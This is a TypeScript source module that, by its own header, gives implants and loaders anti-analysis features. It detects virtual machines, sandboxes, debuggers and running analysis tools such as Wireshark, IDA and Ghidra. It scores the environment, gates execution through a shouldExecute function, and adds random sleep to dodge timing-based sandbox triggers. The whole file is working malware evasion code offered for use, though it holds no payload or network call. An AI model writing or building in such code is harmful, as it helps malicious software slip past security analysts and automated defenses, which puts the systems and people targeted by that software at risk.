/**
 * @module anti_analysis
 * Anti-analysis primitives — sandbox evasion, debugger detection, VM fingerprinting,
 * timing checks, and environment profiling.
 *
 * Used by implants and loaders to detect analyst environments before execution.
 */

import * as os from "node:os";
import { spawnSync } from "node:child_process";
import * as fs from "node:fs";

// ─── Types ────────────────────────────────────────────────────────────────────

export interface EnvironmentProfile {
  platform: string;
  arch: string;
  cpuCores: number;
  totalMemoryGB: number;
  hostname: string;
  username: string;
  isVM: boolean;
  isSandbox: boolean;
  isDebugger: boolean;
  suspiciousProcesses: string[];
  analysisTools: string[];
  score: number;            // 0 = clean, 100 = very suspicious
}

export interface AntiAnalysisOptions {
  live?: boolean;
  verbose?: boolean;
}

// ─── VM Indicators ────────────────────────────────────────────────────────────

const VM_VENDORS = ["vmware", "virtualbox", "hyper-v", "kvm", "qemu", "xen", "parallels", "vbox"];
const VM_MAC_PREFIXES = ["00:0c:29", "00:50:56", "08:00:27", "52:54:00", "00:15:5d", "00:1c:42"];
const SANDBOX_PATHS: string[] = [
  "/proc/1/cgroup",                    // container indicator
  "C:\\windows\\system32\\drivers\\vmci.sys",
  "/dev/vmware",
  "/dev/vboxguest",
];
const ANALYSIS_PROCESS_NAMES = [
  "wireshark", "tcpdump", "procmon", "procexp", "x64dbg", "ollydbg",
  "ida64", "ida", "ghidra", "dnspy", "pe-bear", "pestudio", "die",
  "cutter", "radare2", "r2", "binary ninja", "hopper", "strings2",
];

// ─── Checks ───────────────────────────────────────────────────────────────────

/** Check for VM-related CPU / CPUID / BIOS strings. */
function detectVM(): boolean {
  const cpuModel = os.cpus()[0]?.model?.toLowerCase() ?? "";
  if (VM_VENDORS.some((v) => cpuModel.includes(v))) return true;

  // Check network interface MACs
  const ifaces = Object.values(os.networkInterfaces()).flat();
  for (const iface of ifaces) {
    if (!iface?.mac) continue;
    if (VM_MAC_PREFIXES.some((prefix) => iface.mac.toLowerCase().startsWith(prefix))) return true;
  }

  // Linux: check DMI/BIOS product name
  if (process.platform === "linux") {
    try {
      const product = fs.readFileSync("/sys/class/dmi/id/product_name", "utf8").toLowerCase();
      if (VM_VENDORS.some((v) => product.includes(v))) return true;
    } catch {/* not available */}
  }

  return false;
}

/** Check for sandbox indicators (containers, analysis paths, low resource counts). */
function detectSandbox(): boolean {
  // Low CPU / RAM is classic cuckoo sandbox signature
  if (os.cpus().length < 2) return true;
  if (os.totalmem() < 2 * 1024 ** 3) return true;

  // Check for sandbox-specific paths
  for (const p of SANDBOX_PATHS) {
    if (fs.existsSync(p)) {
      if (p.includes("cgroup")) {
        try {
          const content = fs.readFileSync(p, "utf8");
          if (content.includes("docker") || content.includes("lxc")) return true;
        } catch {/* skip */}
      } else {
        return true;
      }
    }
  }

  // Uptime < 5 minutes is suspicious in sandbox
  if (os.uptime() < 300) return true;

  return false;
}

/** Detect debugger via /proc/self/status TracerPid (Linux). */
function detectDebugger(): boolean {
  if (process.platform === "linux") {
    try {
      const status = fs.readFileSync("/proc/self/status", "utf8");
      const match = status.match(/TracerPid:\s*(\d+)/);
      if (match && parseInt(match[1]) > 0) return true;
    } catch {/* skip */}
  }

  // Windows: check IsDebuggerPresent via node addon (not available, so skip)
  return false;
}

/** Enumerate analysis/security tool processes. */
function findAnalysisTools(): string[] {
  const found: string[] = [];
  let processListOutput = "";

  if (process.platform === "linux" || process.platform === "darwin") {
    const r = spawnSync("ps", ["aux"], { encoding: "utf8", timeout: 5000 });
    processListOutput = r.stdout ?? "";
  } else {
    const r = spawnSync("tasklist", [], { encoding: "utf8", timeout: 5000 });
    processListOutput = r.stdout ?? "";
  }

  const lower = processListOutput.toLowerCase();
  for (const name of ANALYSIS_PROCESS_NAMES) {
    if (lower.includes(name)) found.push(name);
  }

  return found;
}

/** Timing-based sandbox check — sandboxes sometimes accelerate time. */
function timingCheck(): boolean {
  const start = Date.now();
  let x = 0;
  for (let i = 0; i < 10_000_000; i++) x += i;
  const elapsed = Date.now() - start;
  // If 10M iterations complete in <1ms, timing is being manipulated
  return elapsed < 1;
}

// ─── Main API ─────────────────────────────────────────────────────────────────

/**
 * Profile the current execution environment for analysis indicators.
 * Returns a score (0=clean, 100=analyst machine).
 */
export function profileEnvironment(opts: AntiAnalysisOptions = {}): EnvironmentProfile {
  const isVM = detectVM();
  const isSandbox = detectSandbox();
  const isDebugger = detectDebugger();
  const analysisTools = findAnalysisTools();
  const timingManipulated = timingCheck();

  let score = 0;
  if (isVM) score += 30;
  if (isSandbox) score += 40;
  if (isDebugger) score += 30;
  if (analysisTools.length > 0) score += Math.min(analysisTools.length * 10, 20);
  if (timingManipulated) score += 10;

  return {
    platform: process.platform,
    arch: process.arch,
    cpuCores: os.cpus().length,
    totalMemoryGB: Math.round(os.totalmem() / 1024 ** 3 * 10) / 10,
    hostname: os.hostname(),
    username: os.userInfo().username,
    isVM,
    isSandbox,
    isDebugger,
    suspiciousProcesses: analysisTools,
    analysisTools,
    score: Math.min(score, 100),
  };
}

/**
 * Gate: returns true if the environment appears clean enough to proceed.
 * @param threshold Score threshold below which to allow execution (default 30).
 */
export function shouldExecute(threshold = 30, opts: AntiAnalysisOptions = {}): boolean {
  const profile = profileEnvironment(opts);
  return profile.score < threshold;
}

/**
 * Sleep for a random jitter period — evades timing-based sandbox triggers.
 */
export function jitterSleep(minMs = 500, maxMs = 3000): Promise<void> {
  const ms = minMs + Math.random() * (maxMs - minMs);
  return new Promise((r) => setTimeout(r, ms));
}

export default { profileEnvironment, shouldExecute, jitterSleep };
